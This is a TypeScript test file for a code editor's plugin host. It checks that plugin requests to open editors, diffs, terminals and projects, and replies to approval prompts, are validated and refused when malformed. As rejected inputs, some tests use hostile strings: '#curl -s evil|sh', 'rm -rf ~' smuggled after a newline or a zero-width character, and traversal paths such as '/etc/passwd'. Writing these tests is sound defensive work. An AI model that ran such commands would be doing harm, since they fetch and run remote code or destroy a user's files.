import test from "node:test";
import assert from "node:assert/strict";
import {
  parsePluginDiffOpen,
  parsePluginEditorOpen,
  parsePluginProjectOpen,
  parsePluginTerminalOpen,
  parsePluginViewOpen,
  diffModelPath,
  promptEventId,
  utf8Length,
} from "../src/domain/plugins/host-ui.ts";
import {
  filterQuickPickItems,
  parsePluginPrompt,
  promptReply,
  HOST_PROMPT_ORIGIN,
} from "../src/domain/plugins/host-prompts.ts";
import { parsePluginUIOpenRequest } from "../src/domain/plugin-ui/protocol.ts";

const from = { pluginId: "notes", pluginName: "Notes" };

test("editor open requests stay project-relative", () => {
  assert.deepEqual(parsePluginEditorOpen({ ...from, root: "/p", path: "src/a.go", line: 3, column: 2 }), { ...from, root: "/p", path: "src/a.go", line: 3, column: 2 });
  assert.equal(parsePluginEditorOpen({ ...from, root: "/p", path: "src/a.go", column: 2 })?.column, undefined);
  for (const path of ["/etc/passwd", "../x", "a/../../x", ""]) assert.equal(parsePluginEditorOpen({ ...from, root: "/p", path }), undefined, path);
  assert.equal(parsePluginEditorOpen({ pluginId: "Bad Id", root: "/p", path: "a" }), undefined);
});

test("view open requests keep scalar params behind an entry", () => {
  assert.deepEqual(parsePluginViewOpen({ ...from, targetPluginId: "report", viewId: "main", entry: "draft", params: { week: "40", pinned: true } }),
    { ...from, targetPluginId: "report", viewId: "main", entry: "draft", params: { week: "40", pinned: true } });
  assert.equal(parsePluginViewOpen({ ...from, targetPluginId: "report", viewId: "main", params: { a: "b" } }), undefined);
  assert.equal(parsePluginViewOpen({ ...from, targetPluginId: "report", viewId: "main", entry: "x", params: { a: { b: 1 } } }), undefined);
  assert.equal(parsePluginViewOpen({ ...from, targetPluginId: "report", viewId: "../main" }), undefined);
});

test("open requests carry a plugin source and origin", () => {
  assert.deepEqual(parsePluginUIOpenRequest({ requestId: "r1", source: "plugin", from: "notes", entry: "draft" }), { requestId: "r1", source: "plugin", from: "notes", entry: "draft" });
  assert.equal(parsePluginUIOpenRequest({ requestId: "r1", source: "uri", from: "notes", entry: "draft" }), undefined);
  assert.equal(parsePluginUIOpenRequest({ requestId: "r1", source: "plugin", from: "Not An Id", entry: "draft" }), undefined);
});

test("diff and terminal requests are bounded", () => {
  const diff = parsePluginDiffOpen({ ...from, title: "config", language: "yaml", left: { content: "a" }, right: { title: "new", content: "b" } });
  assert.equal(diff?.right.title, "new");
  assert.equal(diff?.left.title, "");
  assert.equal(parsePluginDiffOpen({ ...from, title: "x", left: { content: "x".repeat(256 * 1024 + 1) }, right: { content: "" } }), undefined);
  assert.deepEqual(parsePluginTerminalOpen({ ...from, cwd: "/p/web", command: "npm run dev" }), { ...from, cwd: "/p/web", command: "npm run dev" });
  assert.equal(parsePluginTerminalOpen({ ...from, command: "ls\nrm -rf ~" }), undefined);
});

test("prompts parse and replies only name offered items", () => {
  const pick = parsePluginPrompt({ ...from, id: "prompt-1-1", kind: "quickPick", title: "Profile", items: [{ id: "dev", label: "Dev" }, { id: "prod", label: "Prod", detail: "careful" }] });
  assert.equal(pick?.kind, "quickPick");
  assert.deepEqual(promptReply(pick, { ids: ["prod"] }), { id: "prompt-1-1", reply: { cancelled: false, ids: ["prod"] } });
  assert.equal(promptReply(pick, { ids: ["dev", "prod"] }), undefined);
  assert.equal(promptReply(pick, { ids: ["ghost"] }), undefined);
  assert.deepEqual(promptReply(pick, { cancelled: true }), { id: "prompt-1-1", reply: { cancelled: true } });
  assert.deepEqual(filterQuickPickItems(pick.items, "CARE").map((item) => item.id), ["prod"]);
  assert.equal(parsePluginPrompt({ ...from, id: "prompt-1-1", kind: "quickPick", items: [{ id: "a", label: "A" }, { id: "a", label: "B" }] }), undefined);
  const input = parsePluginPrompt({ ...from, id: "prompt-2-2", kind: "inputBox", title: "Tag", value: "v1", password: true });
  assert.equal(input?.password, true);
  assert.deepEqual(promptReply(input, { value: "v2\n" }), { id: "prompt-2-2", reply: { cancelled: false, value: "v2" } });
  assert.equal(parsePluginPrompt({ ...from, id: "prompt-3-3", kind: "inputBox" }), undefined);
  assert.equal(parsePluginPrompt({ ...from, id: "x", kind: "inputBox", title: "t" }), undefined);
});

test("plugin call approvals only offer remembering when the host allows it", () => {
  const base = { ...from, id: "prompt-9-9", kind: "pluginCall", title: "Work Report", call: { targetPluginId: "report", targetName: "Work Report", action: "activity", risk: "read", payload: "{}" } };
  const read = parsePluginPrompt({ ...base, items: [{ id: "once", label: "once" }, { id: "always", label: "always" }] });
  assert.equal(read?.kind, "pluginCall");
  assert.equal(read.canRemember, true);
  assert.deepEqual(promptReply(read, { ids: ["always"] }), { id: "prompt-9-9", reply: { cancelled: false, ids: ["always"] } });
  const write = parsePluginPrompt({ ...base, call: { ...base.call, risk: "write" }, items: [{ id: "once", label: "once" }] });
  assert.equal(write.canRemember, false);
  assert.equal(promptReply(write, { ids: ["always"] }), undefined);
  assert.equal(parsePluginPrompt({ ...base, call: { ...base.call, risk: "root" }, items: [{ id: "once", label: "once" }] }), undefined);
});

test("database schema approvals carry the connection and validate choices", () => {
  const base = { ...from, id: "prompt-8-8", kind: "databaseSchema", title: "Orders", database: { connectionId: "c1", name: "Orders", kind: "mysql", database: "shop" } };
  const prompt = parsePluginPrompt({ ...base, items: [{ id: "once", label: "once" }, { id: "always", label: "always" }] });
  assert.equal(prompt?.kind, "databaseSchema");
  assert.equal(prompt.canRemember, true);
  assert.deepEqual(prompt.database, { connectionId: "c1", name: "Orders", kind: "mysql", database: "shop" });
  assert.deepEqual(promptReply(prompt, { ids: ["always"] }), { id: "prompt-8-8", reply: { cancelled: false, ids: ["always"] } });
  assert.equal(promptReply(prompt, { ids: ["forever"] }), undefined);
  assert.equal(promptReply(prompt, { value: "always" }), undefined);
  assert.equal(parsePluginPrompt({ ...base, database: { name: "x", kind: "mysql" }, items: [{ id: "once", label: "once" }] }), undefined);
  assert.equal(parsePluginPrompt({ ...base, items: [{ id: "always", label: "always" }] }), undefined);
});

test("terminal commands with hidden characters are refused, like the backend", () => {
  for (const command of ["#curl -s evil|sh\u0001\u0004", "echo \u001b[2K", "echo safe \u202e hs.lave", "rm\u200b -rf ~"]) {
    assert.equal(parsePluginTerminalOpen({ ...from, command }), undefined, JSON.stringify(command));
  }
  assert.equal(parsePluginTerminalOpen({ ...from, command: "echo 你好 && ls -la" })?.command, "echo 你好 && ls -la");
});

test("long display text is cut instead of dropping the request", () => {
  const emoji = "😀".repeat(150); // 150 runes, 300 UTF-16 units
  const pick = parsePluginPrompt({ ...from, id: "prompt-4-4", kind: "quickPick", title: emoji, items: [{ id: "a", label: emoji }] });
  assert.equal(Array.from(pick.items[0].label).length, 150);
  assert.equal(promptEventId({ id: "prompt-5-5", kind: "bogus" }), "prompt-5-5");
  assert.equal(promptEventId({ id: "../x" }), undefined);
});

test("diff language ids map to detectable model paths", () => {
  assert.equal(diffModelPath(3, "typescript"), "plugin-diff/3.ts");
  assert.equal(diffModelPath(3, "python"), "plugin-diff/3.py");
  assert.equal(diffModelPath(3, "yaml"), "plugin-diff/3.yaml");
  assert.equal(diffModelPath(3, "tsx"), "plugin-diff/3.tsx");
  assert.equal(diffModelPath(3), "plugin-diff/3.txt");
  assert.equal(diffModelPath(3, "dockerfile"), "plugin-diff/3/Dockerfile");
});

test("input box limit is counted in bytes", () => {
  const input = parsePluginPrompt({ ...from, id: "prompt-6-6", kind: "inputBox", title: "T" });
  const chinese = "汉".repeat(1400); // 4200 bytes
  assert.equal(utf8Length(chinese), 4200);
  assert.equal(promptReply(input, { value: chinese }), undefined);
  assert.ok(promptReply(input, { value: "汉".repeat(1300) }));
});

test("project open requests require an absolute directory and valid origin", () => {
 assert.deepEqual(parsePluginProjectOpen({...from,path:"/work/theme"}), {...from,path:"/work/theme"});
 for (const path of ["", "relative/theme", "../theme", "/work/\nsecret", "a".repeat(4097)]) assert.equal(parsePluginProjectOpen({...from,path}), undefined);
 assert.equal(parsePluginProjectOpen({pluginId:"Bad Id",path:"/work"}), undefined);
});

test("service provider choices pick one provider and may remember it", () => {
  const items = [
    { id: "provider-0", label: "Alpha Tools", description: "Reverse text", detail: "Fast" },
    { id: "provider-1", label: "Zeta Tools", description: "Reverse" },
  ];
  const base = { ...from, id: "prompt-5-5", kind: "serviceProvider", title: "demo.text.reverse", service: "demo.text.reverse", items };
  const prompt = parsePluginPrompt(base);
  assert.equal(prompt?.kind, "serviceProvider");
  assert.equal(prompt.service, "demo.text.reverse");
  assert.equal(prompt.fromHost, false);
  assert.deepEqual(prompt.items.map((item) => [item.id, item.label, item.description]), [["provider-0", "Alpha Tools", "Reverse text"], ["provider-1", "Zeta Tools", "Reverse"]]);
  assert.deepEqual(promptReply(prompt, { ids: ["provider-1"] }), { id: "prompt-5-5", reply: { cancelled: false, ids: ["provider-1"] } });
  assert.deepEqual(promptReply(prompt, { ids: ["provider-0", "remember"] }), { id: "prompt-5-5", reply: { cancelled: false, ids: ["provider-0", "remember"] } });
  for (const ids of [["provider-0", "provider-1"], ["remember"], ["provider-9"], [], ["provider-0", "always"]]) {
    assert.equal(promptReply(prompt, { ids }), undefined, JSON.stringify(ids));
  }
  assert.equal(promptReply(prompt, { value: "provider-0" }), undefined);
  assert.deepEqual(promptReply(prompt, { cancelled: true }), { id: "prompt-5-5", reply: { cancelled: true } });
  // A service name and at least one provider are required; "remember" is never an item.
  assert.equal(parsePluginPrompt({ ...base, service: "Bad Name" }), undefined);
  assert.equal(parsePluginPrompt({ ...base, items: [] }), undefined);
  assert.equal(parsePluginPrompt({ ...base, items: [...items, { id: "remember", label: "x" }] }), undefined);
});

test("host-initiated service prompts carry the host origin", () => {
  const host = { pluginId: HOST_PROMPT_ORIGIN, pluginName: "MinCode" };
  const choice = parsePluginPrompt({ ...host, id: "prompt-6-6", kind: "serviceProvider", title: "demo.text.reverse", service: "demo.text.reverse", items: [{ id: "provider-0", label: "Alpha" }] });
  assert.equal(choice?.kind, "serviceProvider");
  assert.equal(choice.fromHost, true);
  const call = { targetPluginId: "alpha-tools", targetName: "Alpha Tools", action: "run", risk: "dangerous", payload: "a.png (12 bytes)", service: "demo.image.wipe", serviceTitle: "Wipe metadata" };
  const confirm = parsePluginPrompt({ ...host, id: "prompt-7-7", kind: "serviceConfirm", title: "Wipe metadata", call, items: [{ id: "once", label: "once" }] });
  assert.equal(confirm?.kind, "serviceConfirm");
  assert.equal(confirm.fromHost, true);
  assert.deepEqual(confirm.call, { targetPluginId: "alpha-tools", targetName: "Alpha Tools", service: "demo.image.wipe", serviceTitle: "Wipe metadata", risk: "dangerous", payload: "a.png (12 bytes)" });
  assert.deepEqual(promptReply(confirm, { ids: ["once"] }), { id: "prompt-7-7", reply: { cancelled: false, ids: ["once"] } });
  assert.equal(promptReply(confirm, { ids: ["always"] }), undefined);
  // Only the host confirms host calls, and other prompt kinds never use the host origin.
  assert.equal(parsePluginPrompt({ ...from, id: "prompt-7-7", kind: "serviceConfirm", title: "x", call, items: [{ id: "once", label: "once" }] }), undefined);
  assert.equal(parsePluginPrompt({ ...host, id: "prompt-7-7", kind: "serviceConfirm", title: "x", call: { ...call, service: "" }, items: [{ id: "once", label: "once" }] }), undefined);
  assert.equal(parsePluginPrompt({ ...host, id: "prompt-8-8", kind: "quickPick", title: "x", items: [{ id: "a", label: "a" }] }), undefined);
  assert.equal(parsePluginPrompt({ ...host, id: "prompt-8-8", kind: "pluginCall", title: "x", call, items: [{ id: "once", label: "once" }] }), undefined);
});
